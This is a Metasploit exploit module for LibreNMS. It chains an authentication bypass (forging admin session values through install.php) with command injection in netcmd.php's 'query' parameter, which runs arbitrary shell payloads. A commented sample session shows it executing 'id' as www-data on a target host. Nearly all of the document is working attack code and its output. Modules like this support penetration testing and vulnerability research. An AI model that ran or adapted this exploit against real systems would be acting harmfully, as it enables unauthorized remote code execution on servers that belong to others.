##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'LibreNMS RCE',
      'Description'    => %q{
				This module exploit an auth-bypass in LibreNMS to get admin privileges,
				and then executes code via a command injection.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'blotus',   # original discovery
          'bui',      # original discovery
          'jvoisin',  # original discovery and metasploit module
				],
				'Payload'        =>
				{
					'Compat' => {
            'PayloadType'  => 'cmd',
            'RequiredCmd'  => 'generic telnet perl ruby python',
					},
					'DisableNops' => true,
					'BadChars' => "\x20&#",
				},
      'References'     => [ ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [ [ 'Automatic',{}]],
      'Platform'       => %w{ linux unix },
      'DisclosureDate' => '2017-10-18',
      'Privileged' => false,
      'DefaultTarget'  => 0
			))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
      ])
  end

  def exploit
		print_status("Getting admin cookie...")
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => target_uri.path,
    })
    fail_with(Failure::Unknown, 'No response') if res.nil?
		session_cookie = res.get_cookies

		print_status("Got admin cookie: " + session_cookie)
		send_request_cgi({
			'method'  => 'POST',
			'uri'     => normalize_uri(target_uri.path, '/install.php'),
			'cookie'  => session_cookie,
			'vars_post' => {
				'authenticated' => 1,
				'userlevel' => 10,
				'user_id' => 0
			}
		})

    start_mark = Rex::Text.rand_text_alpha(rand(5) + 5)
    end_mark  = Rex::Text.rand_text_alpha(rand(5) + 5)
    custom_payload = "echo${IFS}#{start_mark};#{payload.encoded};echo${IFS}#{end_mark}"
		res = send_request_cgi({
			'method'  => 'GET',
			'uri'     => normalize_uri(target_uri.path, '/netcmd.php'),
			'cookie'  => session_cookie,
			'vars_get' => {
				'cmd' => 'nmap',
				'debug' => 1,
				'query' => 'http://lol;' + custom_payload
			}
		})

    if res and res.code == 200 and res.body =~ /#{start_mark}/
      # Prints output when using cmd/unix/generic
      result = res.body.split(/#{start_mark}\n/)[1].split(/\n#{end_mark}/)[0]
      if not result.strip.empty?
        print_status("Result of the command:\n#{result}")
      end
    end
  end

end

# msf > use multi/http/librenms_rce
# msf exploit(librenms_rce) > set cmd id
# cmd => id
# msf exploit(librenms_rce) > set RHOST 192.168.0.18
# RHOST => 192.168.0.18
# msf exploit(librenms_rce) > set payload cmd/unix/generic 
# payload => cmd/unix/generic
# msf exploit(librenms_rce) > run
# 
# [*] Getting admin cookie...
# [*] Got admin cookie: PHPSESSID=nmvg7q21egmrbg2enf27tjplt4;
# [*] Result of the command:
# uid=33(www-data) gid=33(www-data) groups=33(www-data),996(librenms)
# [*] Exploit completed, but no session was created.
# msf exploit(librenms_rce) > 
#
